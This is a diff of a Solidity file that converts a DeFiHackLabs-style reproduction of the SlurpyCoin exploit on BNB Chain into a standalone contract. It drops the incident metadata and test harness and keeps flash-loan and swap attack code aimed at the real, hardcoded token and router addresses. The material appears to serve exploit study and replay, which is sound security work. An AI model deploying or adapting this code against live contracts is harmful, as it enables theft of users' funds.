@@ -1,38 +1,22 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
-import "../basetest.sol";
 import "../interface.sol";
 
-// @KeyInfo - Total Lost : 3k USD
-// Attacker : https://bscscan.com/address/0x132d9bbdbe718365af6cc9e43bac109a9a53b138
-// Attack Contract : https://bscscan.com/address/0x051e057ea275caf9a73578a97af6e8965e5a2349
-// Vulnerable Contract : https://bscscan.com/address/0x72c114A1A4abC65BE2Be3E356eEde296Dbb8ba4c
-// Attack Tx : https://bscscan.com/tx/0x6c729ee778332244de099ba0cb68808fcd7be4a667303fcdf2f54dd4b3d29051
-
-// @Info
-// Vulnerable Contract Code : https://bscscan.com/address/0x72c114A1A4abC65BE2Be3E356eEde296Dbb8ba4c#code
-
-// @Analysis
-// Post-mortem : N/A
-// Twitter Guy : https://x.com/CertiKAlert/status/1869580379675590731
-// Hacking God : N/A
-pragma solidity ^0.8.0;
+// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
+// SlurpyCoin_exp.sol test's testExploit()/DPPFlashLoanCall() logic verbatim,
+// but without inheriting forge-std Test/BaseTestWithBalanceLog (which depends
+// on the Foundry cheatcode contract being deployed; that address has no code
+// in a plain EVM replay, so any cheatcode-gated modifier reverts before the
+// real attack logic runs).
 
 address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
 address constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
 address constant SLURPY_ADDR = 0x72c114A1A4abC65BE2Be3E356eEde296Dbb8ba4c;
 address constant DODO_ADDR = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
 
-contract SlurpyCoin is BaseTestWithBalanceLog {
-    uint256 blocknumToForkFrom = 44990635 - 1;
-
-    function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8546", blocknumToForkFrom);
-        fundingToken = address(0);
-    }
-
-    function testExploit() public balanceLog {
+contract SlurpyCoin {
+    function testExploit() external {
         // Step 1: borrow 40 WBNB from DODO
         IDodo(DODO_ADDR).flashLoan(40 ether, 0, address(this), hex"00");
     }
@@ -40,7 +24,7 @@ contract SlurpyCoin is BaseTestWithBalanceLog {
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
         IERC20 wbnb = IERC20(WBNB_ADDR);
         IERC20 slurpy = IERC20(SLURPY_ADDR);
-        
+
         wbnb.approve(PANCAKE_ROUTER, type(uint256).max);
 
         IPancakeRouter router = IPancakeRouter(payable(PANCAKE_ROUTER));
@@ -101,7 +85,9 @@ contract SlurpyCoin is BaseTestWithBalanceLog {
             }
             Helper(helpers[i]).widthdraw(SLURPY_ADDR);
         }
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(slurpy.balanceOf(address(this)), 0, path2, address(this), block.timestamp);
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            slurpy.balanceOf(address(this)), 0, path2, address(this), block.timestamp
+        );
 
         slurpy.approve(PANCAKE_ROUTER, 0);
 
